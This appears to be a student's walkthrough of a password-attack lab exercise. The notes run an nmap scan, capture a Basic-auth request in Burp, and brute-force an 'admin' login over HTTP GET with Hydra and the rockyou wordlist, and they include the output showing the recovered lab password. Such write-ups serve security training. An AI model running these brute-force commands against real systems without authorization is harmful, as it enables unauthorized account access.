
# Walk: Password Attacks - SSH and RDP - VM #4
## Fecha: 20/02/2025
## Host: Ubuntu
## IP: 192.168.232.201
## Objetivo
The web page on VM #2 is password protected. Use Hydra to perform a password attack and get access as user _admin_. Once you have identified the correct password, enter it as the answer to this exercise.
## Herramientas
1. nmap
2. Burp
3. hydra
## Procedimiento y comandos
#### Paso 1: Escanemos el host para enumerar servicios:
- `nmap -sV --open 192.168.232.201 -oN vm-2.nmap-result.txt`
```
Nmap scan report for 192.168.232.201
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
Service Info: Host: 172.25.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.54 seconds
```
#### Obtenemos con Burp la cabecera:
- Hacemos un intento de login con el interceptor activado:
```
GET /index.php HTTP/1.1
Host: 192.168.232.201
Cache-Control: max-age=0
Authorization: Basic YWRtaW46dGVzdA==
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

```
#### Paso 2: Ejecutamos el ataque de diccionario con hydra: 
>Utilizamos metodo http-get - Ataque de autenticación básica en HTTP GET.
- `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.232.201 http-get "/index.php" -f -v`
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-20 12:41:30
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://192.168.232.201:80/index.php
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[80][http-get] host: 192.168.232.201   login: admin   password: 789456
[STATUS] attack finished for 192.168.232.201 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-20 12:41:48
```
- [80][http-get] host: 192.168.232.201   login: admin   password: **789456**
